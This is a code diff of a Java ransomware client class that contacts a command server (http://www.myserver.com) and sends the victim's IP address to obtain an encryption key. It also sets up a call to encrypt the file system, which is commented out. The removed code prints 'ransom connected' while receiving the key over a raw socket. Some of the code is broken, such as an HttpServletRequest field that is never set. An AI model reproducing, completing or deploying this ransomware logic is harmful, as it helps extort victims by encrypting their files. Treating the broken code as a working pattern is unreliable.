@@ -1,67 +1,50 @@
 package Agent.networking;
 
-import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.net.HttpURLConnection;
 import java.net.Socket;
 import java.net.URL;
+import javax.servlet.http.HttpServletRequest;
 
 import org.springframework.beans.factory.annotation.Value;
-
 import Agent.Attack.AttackVector;
 import Agent.entites.CryptoKey;
 
 public class Client {
-	@Value("${server.port}")
-	private int port;
-	@Value("${server.host}")
-	private String host;
 
-	//commit
-	public void start() throws Exception {
-		try {
-			while (true) {
-				Socket clientSocket = new Socket(host, port);
-				ObjectInputStream is = new ObjectInputStream(clientSocket.getInputStream());
-				System.out.println("ransom connected + got input stream");
+	HttpServletRequest request;
+
+
+	public void getCrypto() throws IOException {
+
+		URL urlForGetRequest = new URL("http://www.myserver.com");
+		HttpURLConnection con = (HttpURLConnection) urlForGetRequest.openConnection();
+		String ipAdress = request.getRemoteAddr();
+		con.setRequestMethod("GET");
+		con.setRequestProperty("Content-Type", "application/json");
+		con.setRequestProperty("ip", ipAdress); // set userId its a sample here
+		int responseCode = con.getResponseCode();
+		if (responseCode == HttpURLConnection.HTTP_OK) {
+			ObjectInputStream is = new ObjectInputStream(con.getInputStream());
+			try {
 				CryptoKey key = (CryptoKey) is.readObject();
 				AttackVector attack = new AttackVector();
-				//.attacattack.encryptFileSystem(key);
-				clientSocket.close();
+				//attack.encryptFileSystem(key);
+			} catch (ClassNotFoundException | IOException e) {
+				e.printStackTrace();
 			}
-		} catch (ClassNotFoundException | IOException e) {
-			throw new Exception();
+
+			/*
+			 * try (BufferedReader in = new BufferedReader(new
+			 * InputStreamReader(con.getInputStream()))) { StringBuffer response = new
+			 * StringBuffer(); while ((readLine = in.readLine()) != null) {
+			 * response.append(readLine); in.close();
+			 */
+
+		} else {
+			System.out.println("GET NOT WORKED");
 		}
 	}
 
-	public void getCrypto() {
-		 try {
-		        String toSend = "CryptoKey";
-		        String urlParameters = "message=" + toSend;
-		        String request = "http://127.0.0.1:8080/Project/message.html";
-		        URL url = new URL(request);
-
-		        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-		        connection.setDoOutput(true);
-		        connection.setDoInput(true);
-		        connection.setInstanceFollowRedirects(false);
-		        connection.setRequestMethod("POST");
-		        connection.setRequestProperty("Content-Type","");
-		        connection.setRequestProperty("charset", "utf-8");
-		        connection.setRequestProperty("Content-Length","" + Integer.toString(urlParameters.getBytes().length));
-		        connection.setUseCaches(false);
-
-		        DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
-		        wr.writeBytes(urlParameters);
-
-		        int code = connection.getResponseCode();
-		        System.out.println(code);
-		        wr.flush();
-		        wr.close();
-		        connection.disconnect();
-		    } catch (Exception e) {
-		        e.printStackTrace();
-		    }
-	}
 }
